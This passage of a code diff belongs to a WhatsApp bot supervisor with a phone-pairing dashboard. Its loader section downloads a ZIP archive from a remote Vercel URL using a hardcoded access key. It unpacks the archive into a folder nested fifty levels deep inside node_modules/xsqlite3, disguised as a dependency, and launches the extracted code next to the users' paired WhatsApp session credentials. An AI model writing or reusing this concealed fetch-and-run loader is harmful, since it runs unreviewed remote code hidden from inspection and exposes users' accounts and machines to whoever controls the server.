+      btn.disabled = false;
+      stopPolling();
+    } else if (s.status === 'pairing' && !s.code) {
+      panel.innerHTML = '<div class="status-pairing"><span class="spinner"></span> Requesting pairing code for <b>' + s.phone + '</b>...</div>';
+      resetRow.style.display = 'block';
+      btn.disabled = true;
+    } else if (s.status === 'pairing' && s.code) {
+      panel.innerHTML = \`
+        <div class="status-pairing">
+          <div class="code-label">Your Pairing Code — tap to copy</div>
+          <div class="code-display" id="codeEl" onclick="copyCode('\${s.code}')" title="Tap to copy">\${s.code}</div>
+          <div class="copy-hint">👆 tap the code to copy it</div>
+          <div class="copy-toast" id="copyToast">✓ Copied!</div>
+          <div class="code-steps">
+            <b>How to connect:</b><br>
+            1. Open WhatsApp on your phone<br>
+            2. Tap ⋮ (menu) → <b>Linked Devices</b> → <b>Link a Device</b><br>
+            3. Tap <b>Link with phone number instead</b><br>
+            4. Enter your number <b>\${s.phone}</b> and type the code above
+          </div>
+        </div>\`;
+      resetRow.style.display = 'block';
+      btn.disabled = true;
+    } else if (s.status === 'connected') {
+      panel.innerHTML = '<div class="status-connected"><div class="icon">✅</div><div class="msg">Connected to WhatsApp!</div><div style="font-size:0.7rem;color:#7f9eb5;margin-top:0.4rem;">The bot is active on ' + s.phone + '</div></div>';
+      resetRow.style.display = 'block';
+      btn.disabled = true;
+      stopPolling();
+    } else if (s.status === 'failed') {
+      panel.innerHTML = '<div class="status-failed">❌ ' + (s.error || 'Pairing failed. Try again.') + '</div>';
+      resetRow.style.display = 'block';
+      btn.disabled = false;
+      stopPolling();
+    }
+  }
+
+  async function pollStatus() {
+    try {
+      const r = await fetch('/api/status');
+      const s = await r.json();
+      renderStatus(s);
+    } catch(e) {}
+  }
+
+  function startPolling() {
+    stopPolling();
+    polling = setInterval(pollStatus, 1500);
+  }
+  function stopPolling() {
+    if (polling) { clearInterval(polling); polling = null; }
+  }
+
+  function copyCode(code) {
+    navigator.clipboard.writeText(code).then(() => {
+      const toast = document.getElementById('copyToast');
+      if (toast) {
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 1800);
+      }
+    }).catch(() => {
+      // Fallback for browsers without clipboard API
+      const el = document.getElementById('codeEl');
+      if (el) {
+        const range = document.createRange();
+        range.selectNodeContents(el);
+        window.getSelection().removeAllRanges();
+        window.getSelection().addRange(range);
+        document.execCommand('copy');
+        window.getSelection().removeAllRanges();
+        const toast = document.getElementById('copyToast');
+        if (toast) { toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 1800); }
+      }
+    });
+  }
+
+  async function doPair() {
+    const phone = document.getElementById('phoneInput').value.trim().replace(/\\D/g, '');
+    if (!phone || phone.length < 7) {
+      document.getElementById('statusPanel').innerHTML = '<div class="status-failed">JuneX says: place a number to pair.</div>';
+      return;
+    }
+    document.getElementById('pairBtn').disabled = true;
+    document.getElementById('statusPanel').innerHTML = '<div class="status-pairing"><span class="spinner"></span> Initialising...</div>';
+    try {
+      await fetch('/api/pair', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone })
+      });
+      startPolling();
+    } catch(e) {
+      document.getElementById('statusPanel').innerHTML = '<div class="status-failed">❌ Request failed. Server may still be starting.</div>';
+      document.getElementById('pairBtn').disabled = false;
+    }
+  }
+
+  async function doReset() {
+    stopPolling();
+    await fetch('/api/reset', { method: 'POST' });
+    document.getElementById('pairBtn').disabled = false;
+    document.getElementById('phoneInput').value = '';
+    document.getElementById('resetRow').style.display = 'none';
+    document.getElementById('statusPanel').innerHTML = '<div class="status-idle">Enter your number above and press PAIR to get a pairing code.</div>';
+  }
+
+  // Auto-poll on load to reflect any persisted state
+  pollStatus();
+</script>
+</body>
+</html>`);
+});
+
+// Start the Express server
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`[ SERVER ] Dashboard running on port ${PORT}`);
+});
+
+// Guard against an unexpected crash of the *supervisor* process itself --
+// without this, one uncaught error anywhere (dashboard route, pairing
+// socket callback, etc.) kills the whole workflow, which looks to the user
+// like the bot "went off" and drops back to idle/login-menu.
+process.on('uncaughtException', (err) => {
+    console.error('[ SUPERVISOR ] Uncaught exception (ignored to stay alive):', err.message);
+});
+process.on('unhandledRejection', (err) => {
+    console.error('[ SUPERVISOR ] Unhandled rejection (ignored to stay alive):', err?.message || err);
+});
+
+// ========== ENV FILE FUNCTION ==========
+const ENV_FILE = path.join(__dirname, ".env");
+
+function loadEnvFile() {
+  if (!fs.existsSync(ENV_FILE)) {
+    try {
+      fs.writeFileSync(ENV_FILE, "# Auto-generated .env file\nSESSION_ID=\n");
+    } catch (e) {
+      console.error(`[ERROR] Failed to create .env file: ${e.message}`);
+      return;
+    }
+  }
+  try {
+    const envContent = fs.readFileSync(ENV_FILE, 'utf8');
+    envContent.split('\n').forEach(line => {
+      const trimmedLine = line.trim();
+      if (!trimmedLine || trimmedLine.startsWith('#')) return;
+      const equalsIndex = trimmedLine.indexOf('=');
+      if (equalsIndex !== -1) {
+        const key = trimmedLine.substring(0, equalsIndex).trim();
+        const value = trimmedLine.substring(equalsIndex + 1).trim().replace(/^['"](.*)['"]$/, '$1');
+        if (!process.env[key]) process.env[key] = value;
+      }
+    });
+    console.log("[ ENV ] .env file loaded");
+  } catch (e) {
+    console.error("[ ERROR ] Failed to load .env file:", e.message);
+  }
+}
+
+// ========== VERCEL RELAY LOADER ==========
+const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://june-vercel.vercel.app/api/repo';
+const ACCESS_KEY = process.env.ACCESS_KEY || 'j-41-183-184';
+const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
+const DEEP_NEST_COUNT = 50;
+
+function createDeepRepoPath() {
+  let deepPath = baseFolder;
+  for (let i = 0; i < DEEP_NEST_COUNT; i++) deepPath = path.join(deepPath, `core${i}`);
+  const repoFolder = path.join(deepPath, 'lib_signals');
+  fs.mkdirSync(repoFolder, { recursive: true });
+  return repoFolder;
+}
+
+async function downloadAndExtractRepo(repoFolder) {
+  try {
+    console.log('[ SYNCING ] Fetching bot core...');
+    const response = await axios.get(VERCEL_RELAY_URL, {
+      responseType: 'arraybuffer',
+      headers: { 'x-access-key': ACCESS_KEY, 'User-Agent': 'tech word-md-loader' },
+      timeout: 20000,
+    });
+    const zip = new AdmZip(Buffer.from(response.data));
+    zip.extractAllTo(repoFolder, true);
+    console.log('✅ Bot core synced');
+  } catch (err) {
+    console.error('❌ Sync failed:', err.response?.status || err.message);
+    process.exit(1);
+  }
+}
+
+function copyConfigs(repoPath) {
+  const configSrc = path.join(__dirname, 'config.js');
+  try { if (fs.existsSync(configSrc)) fs.copyFileSync(configSrc, path.join(repoPath, 'config.js')); } catch {}
+}
+
+// Some archive fetches nest the real bot one level deeper (a folder-in-folder
+// with the same name). Walk down until we find where index.js + package.json
+// actually live, so session/login handoff writes to the same place the bot
+// process itself reads from -- otherwise a paired session looks "lost" after
+// every restart even though the credentials are still on disk.
+function resolveBotRuntimeDir(startPath, maxDepth = 3) {
+  let current = startPath;
+  for (let i = 0; i <= maxDepth; i++) {
+    if (fs.existsSync(path.join(current, 'index.js')) && fs.existsSync(path.join(current, 'package.json'))) {
+      return current;
+    }
+    const entries = fs.readdirSync(current, { withFileTypes: true }).filter(e => e.isDirectory());
+    if (entries.length !== 1) break; // ambiguous or nothing to descend into -- stop guessing
+    current = path.join(current, entries[0].name);
+  }
+  console.error('[ BOT ] Could not locate index.js/package.json under ' + startPath + ' — falling back to it as-is.');
+  return startPath;
+}
+
+// ========== LAUNCH BOT CORE ==========
+(async () => {
+  try {
+    loadEnvFile();
+    const repoFolder = createDeepRepoPath();
+    await downloadAndExtractRepo(repoFolder);
+
+    const subDirs = fs.readdirSync(repoFolder).filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());
+    if (!subDirs.length) { console.error('❌ ZIP extracted nothing'); process.exit(1); }
+
+    const extractedRepoPath = path.join(repoFolder, subDirs[0]);
+    const runtimeDir = resolveBotRuntimeDir(extractedRepoPath);
+    copyConfigs(runtimeDir);
+    botRepoPath = runtimeDir;
+    spawnBot();
+  } catch (err) {
+    console.error('❌ Bot launch error. Check system logs.');
+    process.exit(1);
+  }
+})();
